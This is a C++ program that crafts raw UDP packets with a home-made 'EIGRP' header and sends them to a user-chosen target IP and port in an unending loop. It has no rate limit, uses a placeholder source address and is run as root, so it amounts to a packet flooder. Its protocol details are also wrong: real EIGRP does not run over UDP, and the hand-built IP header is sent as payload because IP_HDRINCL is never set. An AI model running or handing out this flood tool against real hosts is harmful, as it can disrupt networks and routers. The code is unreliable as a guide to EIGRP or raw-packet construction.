#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <sys/types.h>

// EIGRP Header
struct eigrp_header {
    uint8_t opcode;
    uint8_t as_number;
    uint8_t autype;
    uint8_t reserved;
    uint16_t length;
    uint16_t checksum;
};

// Pseudo header needed for UDP checksum calculation
struct pseudo_header {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t udp_length;
};

// Calculate checksum
uint16_t calculate_checksum(uint16_t *data, int length) {
    uint32_t sum = 0;
    while (length > 1) {
        sum += *data++;
        length -= 2;
    }
    if (length) {
        sum += *(uint8_t *)data;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

// Create and send EIGRP packet
void send_eigrp_packet(const char* target_ip, uint16_t target_port) {
    while (true)
    {
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if (sockfd < 0) {
            perror("Socket creation failed");
            exit(EXIT_FAILURE);
        }

        struct sockaddr_in dest_addr;
        memset(&dest_addr, 0, sizeof(dest_addr));
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(target_port);
        dest_addr.sin_addr.s_addr = inet_addr(target_ip);

        // EIGRP Packet
        struct eigrp_header eigrp;
        memset(&eigrp, 0, sizeof(eigrp));
        eigrp.opcode = 0x01; // Example opcode
        eigrp.as_number = 0; // Example AS number
        eigrp.autype = 0;    // Example authentication type
        eigrp.reserved = 0;
        eigrp.length = htons(sizeof(eigrp)); // Length of EIGRP header
        eigrp.checksum = 0;  // Checksum to be calculated later

        // UDP Header
        struct udphdr udp;
        memset(&udp, 0, sizeof(udp));
        udp.source = htons(12345); // Arbitrary source port
        udp.dest = htons(target_port);
        udp.len = htons(sizeof(udp) + sizeof(eigrp));
        udp.check = 0; // Checksum to be calculated later

        // IP Header
        struct iphdr ip;
        memset(&ip, 0, sizeof(ip));
        ip.ihl = 5;
        ip.version = 4;
        ip.tot_len = htons(sizeof(ip) + sizeof(udp) + sizeof(eigrp));
        ip.ttl = 64;
        ip.protocol = IPPROTO_UDP;
        ip.saddr = inet_addr("0.0.0.0"); // Source IP address (assumed)
        ip.daddr = dest_addr.sin_addr.s_addr;

        // Pseudo header needed for UDP checksum calculation
        struct pseudo_header psh;
        memset(&psh, 0, sizeof(psh));
        psh.source_address = ip.saddr;
        psh.dest_address = ip.daddr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_UDP;
        psh.udp_length = udp.len;

        // Calculate UDP checksum
        int udp_size = sizeof(udp) + sizeof(eigrp);
        char *pseudo_packet = new char[sizeof(pseudo_header) + udp_size];
        memcpy(pseudo_packet, &psh, sizeof(pseudo_header));
        memcpy(pseudo_packet + sizeof(pseudo_header), &udp, sizeof(udp));
        memcpy(pseudo_packet + sizeof(pseudo_header) + sizeof(udp), &eigrp, sizeof(eigrp));
        udp.check = calculate_checksum(reinterpret_cast<uint16_t*>(pseudo_packet), sizeof(pseudo_header) + udp_size);
        delete[] pseudo_packet;

        // Full Packet
        char* packet = new char[sizeof(ip) + sizeof(udp) + sizeof(eigrp)];
        memcpy(packet, &ip, sizeof(ip));
        memcpy(packet + sizeof(ip), &udp, sizeof(udp));
        memcpy(packet + sizeof(ip) + sizeof(udp), &eigrp, sizeof(eigrp));

        // Send the packet
        if (sendto(sockfd, packet, sizeof(ip) + sizeof(udp) + sizeof(eigrp), 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr)) < 0) {
            perror("Send failed");
            close(sockfd);
            delete[] packet;
            exit(EXIT_FAILURE);
        }

        std::cout << "EIGRP packet sent to " << target_ip << ":" << target_port << std::endl;

        close(sockfd);
        delete[] packet;
    }
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <target_ip> <target_port>" << std::endl;
        return EXIT_FAILURE;
    }

    const char* target_ip = argv[1];
    uint16_t target_port = static_cast<uint16_t>(atoi(argv[2]));
    send_eigrp_packet(target_ip, target_port);

    return EXIT_SUCCESS;
}
// g++ -o send_eigrp send_eigrp.cpp
// sudo ./send_eigrp <target_ip> <target_port>